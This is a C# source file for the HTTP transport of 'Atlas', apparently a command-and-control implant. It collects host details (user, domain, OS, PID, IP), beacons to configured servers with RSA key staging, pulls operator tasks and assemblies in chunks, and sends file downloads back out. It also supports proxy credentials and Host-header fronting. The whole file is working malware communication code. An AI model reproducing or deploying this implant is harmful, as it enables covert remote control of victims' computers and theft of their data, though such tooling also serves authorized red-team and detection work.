using System;
using System.Net;
using System.Linq;
#if DEFAULT
using System.Text;
#endif
using System.Collections.Generic;
using System.Diagnostics;
using Microsoft.Win32;

namespace Atlas
{
    public class Http
    {
        public static bool CheckIn()
        {
            try
            {
#if DEFAULT_EKE
                Crypto.GenRsaKeys();
                Messages.GetStage GetStage = new Messages.GetStage
                {
                    action = "staging_rsa",
                    pub_key = Crypto.GetPubKey(),
                    session_id = Utils.GetSessionId()

                };
                Config.SessionId = GetStage.session_id;
                string SerializedData = Crypto.EncryptStage(Messages.GetStage.ToJson(GetStage));
                var result = Get(SerializedData);
                string final_result = Crypto.Decrypt(result);
                Messages.StageResponse StageResponse = Messages.StageResponse.FromJson(final_result);
                Config.tempUUID = StageResponse.uuid;
                Config.Psk = Convert.ToBase64String(Crypto.RsaDecrypt(Convert.FromBase64String(StageResponse.session_key)));
#endif
                Messages.CheckIn CheckIn = new Messages.CheckIn
                {
                    action = "checkin",
                    ip = Utils.GetIPAddress(),
                    os = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName", "").ToString() + " " + Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ReleaseId", ""),
                    user = Environment.UserName.ToString(),
                    host = Environment.MachineName.ToString(),
                    domain = Environment.UserDomainName.ToString(),
                    pid = Process.GetCurrentProcess().Id,
                    uuid = Config.PayloadUUID,
                    architecture = Utils.GetArch()
                };
#if DEFAULT
                string FinalSerializedData = Convert.ToBase64String(Encoding.UTF8.GetBytes(Config.PayloadUUID + Messages.CheckIn.ToJson(CheckIn)));
#elif (DEFAULT_PSK || DEFAULT_EKE)
                string FinalSerializedData = Crypto.EncryptCheckin(Messages.CheckIn.ToJson(CheckIn));
#endif
                var new_result = Get(FinalSerializedData);
#if (DEFAULT_PSK || DEFAULT_EKE)
                string last_result = Crypto.Decrypt(new_result);
#endif
#if DEFAULT
                Messages.CheckInResponse CheckInResponse = Messages.CheckInResponse.FromJson(Encoding.UTF8.GetString(Convert.FromBase64String(new_result)).Substring(36));
#elif (DEFAULT_PSK || DEFAULT_EKE)
                Messages.CheckInResponse CheckInResponse = Messages.CheckInResponse.FromJson(last_result);
#endif
                Config.UUID = CheckInResponse.id;
                if (CheckInResponse.status == "success")
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
            catch
            {
                return false;
            }
        }

        public static bool GetTasking(Messages.JobList JobList)
        {
            try
            {
                foreach (Messages.Job Job in JobList.jobs)
                {
                    if (Job.upload)
                    {
                        if ((Job.total_chunks != Job.chunk_num) & (Job.total_chunks != 0))
                        {
                            if (!Job.chunking_started)
                            {
                                Messages.UploadTasking UploadTasking = Messages.UploadTasking.FromJson(Job.parameters);
                                Job.file_id = UploadTasking.assembly_id;
                                Job.path = UploadTasking.remote_path;
                                Messages.Upload Upload = new Messages.Upload
                                {
                                    action = "upload",
                                    chunk_size = Config.ChunkSize,
                                    file_id = Job.file_id,
                                    chunk_num = Job.chunk_num,
                                    full_path = Job.path,
                                    task_id = Job.task_id
                                };
                                Messages.UploadResponse UploadResponse = Http.GetUpload(Upload);
                                Job.total_chunks = UploadResponse.total_chunks;
                                Job.chunks.Add(UploadResponse.chunk_data);
                                Job.chunking_started = true;
                            }
                            else
                            {
                                Job.chunk_num++;
                                Messages.Upload ChunkUpload = new Messages.Upload
                                {
                                    action = "upload",
                                    chunk_size = Config.ChunkSize,
                                    file_id = Job.file_id,
                                    chunk_num = Job.chunk_num,
                                    full_path = Job.path,
                                    task_id = Job.task_id
                                };
                                Messages.UploadResponse UploadResponse = Http.GetUpload(ChunkUpload);
                                Job.chunks.Add(UploadResponse.chunk_data);
                            }
                        }
                    }
                }
                Messages.GetTasking GetTasking = new Messages.GetTasking
                {
                    action = "get_tasking",
                    tasking_size = -1
                };
#if DEFAULT
                string SerializedData = Convert.ToBase64String(Encoding.UTF8.GetBytes(Config.UUID + Messages.GetTasking.ToJson(GetTasking)));
#elif (DEFAULT_PSK || DEFAULT_EKE)
                string SerializedData = Crypto.Encrypt(Messages.GetTasking.ToJson(GetTasking));
#endif
                var result = Get(SerializedData);
#if DEFAULT
                string final_result = Encoding.UTF8.GetString(Convert.FromBase64String(result));
#elif (DEFAULT_PSK || DEFAULT_EKE)
                string final_result = Crypto.Decrypt(result);
#endif
                if (final_result.Substring(0, 36) != Config.UUID)
                {
                    return false;
                }
                Messages.GetTaskingResponse GetTaskResponse = Messages.GetTaskingResponse.FromJson(final_result.Substring(36));
                if (GetTaskResponse.tasks[0].command == "")
                {
                    return false;
                }
                foreach (Messages.Task task in GetTaskResponse.tasks) {
                    Messages.Job Job = new Messages.Job
                    {
                        job_id = JobList.job_count,
                        task_id = task.id,
                        completed = false,
                        job_started = false,
                        success = false,
                        command = task.command,
                        parameters = task.parameters,
                        total_chunks = 0
                    };
                    if (Job.command == "loadassembly" || Job.command == "upload")
                    {
                        Job.upload = true;
                        Job.total_chunks = 2;
                        Job.chunk_num = 1;
                    }
                    else if (Job.command == "download")
                    {
                        Job.download = true;
                    }
                    else if (Job.command == "jobs")
                    {
                        Job.response = JobManagement.GetJobs(JobList);
                        Job.completed = true;
                        Job.success = true;
                    }
                    else if (Job.command == "jobkill")
                    {
                        if (JobManagement.KillJob(JobList, Int32.Parse(Job.parameters)))
                        {
                            Job.completed = true;
                            Job.success = true;
                            Job.response = "Job successfully removed";
                        }
                        else
                        {
                            Job.completed = true;
                            Job.success = false;
                            Job.response = "Could not remove job";
                        }
                    }
                    JobList.jobs.Add(Job);
                    ++JobList.job_count;
                }
                return true;
            }
            catch
            {
                return false;
            }
        }

        public static Messages.UploadResponse GetUpload(Messages.Upload Upload)
        {
            try
            {
#if DEFAULT
                string SerializedData = Convert.ToBase64String(Encoding.UTF8.GetBytes(Config.UUID + Messages.Upload.ToJson(Upload)));
#elif (DEFAULT_PSK || DEFAULT_EKE)
                string SerializedData = Crypto.Encrypt(Messages.Upload.ToJson(Upload));
#endif
                var result = Get(SerializedData);
#if DEFAULT
                string final_result = Encoding.UTF8.GetString(Convert.FromBase64String(result));
#elif (DEFAULT_PSK || DEFAULT_EKE)
                string final_result = Crypto.Decrypt(result);
#endif
                Messages.UploadResponse UploadResponse = Messages.UploadResponse.FromJson(final_result.Substring(36));

                return UploadResponse;
            }
            catch
            {
                Messages.UploadResponse UploadResponse = new Messages.UploadResponse { };
                return UploadResponse;
            }
        }

        public static bool PostResponse(Messages.JobList JobList)
        {
            try
            {
                Messages.PostResponse PostResponse = new Messages.PostResponse
                {
                    action = "post_response",
                    responses = { }
                };
                foreach (Messages.Job Job in JobList.jobs)
                {
                    if (Job.completed)
                    {
                         if (!Job.success)
                        {
                            Messages.TaskResponse TaskResponse = new Messages.TaskResponse
                            {
                                task_id = Job.task_id,
                                user_output = Job.response,
                                status = "error",
                                completed = "false",
                                total_chunks = null,
                                full_path = null,
                                chunk_num = null,
                                chunk_data = null,
                                file_id = null
                            };
                            PostResponse.responses.Add(TaskResponse);
                        }
                        else if (Job.download)
                        {
                            if (Job.file_id == null)
                            {
                                Messages.TaskResponse TaskResponse = new Messages.TaskResponse
                                {
                                    task_id = Job.task_id,
                                    user_output = null,
                                    status = null,
                                    completed = null,
                                    total_chunks = Job.total_chunks,
                                    full_path = Job.path,
                                    chunk_num = null,
                                    chunk_data = null,
                                    file_id = null
                                };
                                PostResponse.responses.Add(TaskResponse);
                            }
                            else if (Job.chunk_num == Job.total_chunks)
                            {
                                Messages.TaskResponse TaskResponse = new Messages.TaskResponse
                                {
                                    task_id = Job.task_id,
                                    user_output = null,
                                    status = null,
                                    completed = "true",
                                    total_chunks = null,
                                    full_path = null,
                                    chunk_num = Job.chunk_num,
                                    chunk_data = Job.chunks[0],
                                    file_id = Job.file_id
                                };
                                PostResponse.responses.Add(TaskResponse);
                            }
                            else
                            {
                                Messages.TaskResponse TaskResponse = new Messages.TaskResponse
                                {
                                    task_id = Job.task_id,
                                    user_output = null,
                                    status = null,
                                    completed = null,
                                    total_chunks = null,
                                    full_path = null,
                                    chunk_num = Job.chunk_num,
                                    chunk_data = Job.chunks[0],
                                    file_id = Job.file_id
                                };
                                PostResponse.responses.Add(TaskResponse);
                            }
                        }
                        else if ((Job.total_chunks != 0) && (!Job.upload))
                        {
                            if (Job.chunk_num != Job.total_chunks)
                            {
                                Messages.TaskResponse TaskResponse = new Messages.TaskResponse
                                {
                                    task_id = Job.task_id,
                                    user_output = Job.chunks[0],
                                    completed = "false",
                                    total_chunks = null,
                                    full_path = null,
                                    chunk_num = null,
                                    chunk_data = null,
                                    file_id = null
                                };
                                PostResponse.responses.Add(TaskResponse);
                            }
                            else
                            {
                                Messages.TaskResponse TaskResponse = new Messages.TaskResponse
                                {
                                    task_id = Job.task_id,
                                    user_output = Job.chunks[0],
                                    completed = "true",
                                    total_chunks = null,
                                    full_path = null,
                                    chunk_num = null,
                                    chunk_data = null,
                                    file_id = null
                                };
                                PostResponse.responses.Add(TaskResponse);
                            }
                        }
                        else
                        {
                            Messages.TaskResponse TaskResponse = new Messages.TaskResponse
                            {
                                task_id = Job.task_id,
                                user_output = Job.response,
                                completed = "true",
                                total_chunks = null,
                                full_path = null,
                                chunk_num = null,
                                chunk_data = null,
                                file_id = null
                            };
                            PostResponse.responses.Add(TaskResponse);
                        }
                    }
                }
                if (PostResponse.responses.Count < 1)
                {
                    return false;
                }
                string Data = Messages.PostResponse.ToJson(PostResponse);
#if DEFAULT
                string SerializedData = Convert.ToBase64String(Encoding.UTF8.GetBytes(Config.UUID + Messages.PostResponse.ToJson(PostResponse)));
#elif (DEFAULT_PSK || DEFAULT_EKE)
                string SerializedData = Crypto.Encrypt(Messages.PostResponse.ToJson(PostResponse));
#endif
                string result = Post(SerializedData);
#if DEFAULT
                string final_result = Encoding.UTF8.GetString(Convert.FromBase64String(result));
#elif (DEFAULT_PSK || DEFAULT_EKE)
                string final_result = Crypto.Decrypt(result);
#endif
                Messages.PostResponseResponse PostResponseResponse = Messages.PostResponseResponse.FromJson(final_result.Substring(36));
                List<Messages.Job> TempList = new List<Messages.Job>(JobList.jobs);
                foreach (Messages.Response Response in PostResponseResponse.responses)
                {
                    foreach (Messages.Job Job in TempList)
                    {
                        if (Job.completed)
                        {
                            if (Job.task_id == Response.task_id)
                            {
                                if (Response.status == "success")
                                {
                                    if (Job.download)
                                    {
                                        if (Job.file_id == null)
                                        {
                                            Job.file_id = Response.file_id;
                                        }
                                        if (Job.total_chunks == Job.chunk_num)
                                        {
                                            JobManagement.RemoveJob(Job, JobList);
                                        }
                                        else
                                        {
                                            if (Job.chunks.Count != 0)
                                            {
                                                Job.completed = true;
                                                Job.chunks.RemoveAt(0);
                                            }
                                        }
                                    }
                                    else if ((Job.total_chunks != 0) & (!Job.upload))
                                    {
                                        if (Job.chunk_num + 1 != Job.total_chunks)
                                        {
                                            Job.chunks.RemoveAt(0);
                                            Job.chunk_num++;
                                        }
                                        else
                                        {
                                            JobManagement.RemoveJob(Job, JobList);
                                        }
                                    }
                                    else
                                    {
                                        JobManagement.RemoveJob(Job, JobList);
                                    }
                                }
                            }
                        }
                    }
                }
                TempList = null;
                return true;
            }
            catch
            {
                return false;
            }
        }
        public static string Get(string B64Data)
        {
            string result = null;
            WebClient client = new System.Net.WebClient();
            if (Config.DefaultProxy)
            {
                client.Proxy = WebRequest.DefaultWebProxy;
                client.UseDefaultCredentials = true;
                client.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
            }
            else
            {
                WebProxy proxy = new WebProxy
                {
                    Address = new Uri(Config.ProxyAddress),
                    UseDefaultCredentials = false,
                    Credentials = new NetworkCredential(Config.ProxyUser, Config.ProxyPassword)
                };
                client.Proxy = proxy;
            }
            client.Headers.Add("User-Agent", Config.UserAgent);
#if NET_4
            if (Config.HostHeader != "")
            {
                client.Headers.Add("Host", Config.HostHeader);
            }
#endif
            client.QueryString.Add(Config.Param, B64Data.Replace("+", "%2B").Replace("/", "%2F").Replace("=", "%3D").Replace("\n", "%0A"));
            Config.Servers = Config.Servers.OrderBy(s=>s.count).ToList();
            try
            {
                result = client.DownloadString(Config.Servers[0].domain + Config.GetUrl);
                return result;
            }
            catch
            {
                Config.Servers[0].count++;
                return result;
            }
        }

        public static string Post(string B64Data)
        {
            string result = null;
            WebClient client = new System.Net.WebClient();
            if (Config.DefaultProxy)
            {
                client.Proxy = WebRequest.DefaultWebProxy;
                client.UseDefaultCredentials = true;
                client.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
            }
            else
            {
                WebProxy proxy = new WebProxy
                {
                    Address = new Uri(Config.ProxyAddress),
                    UseDefaultCredentials = false,
                    Credentials = new NetworkCredential(Config.ProxyUser, Config.ProxyPassword)
                };
                client.Proxy = proxy;
            }
            client.Headers.Add("User-Agent", Config.UserAgent);
#if NET_4
            if (Config.HostHeader != "")
            {
                client.Headers.Add("Host", Config.HostHeader);
            }
#endif
            Config.Servers = Config.Servers.OrderBy(s => s.count).ToList();
            try
            {
                result = client.UploadString(Config.Servers[0].domain + Config.PostUrl, B64Data);
                return result;
            }
            catch
            {
                Config.Servers[0].count++;
                return result;
            }
        }
    }
}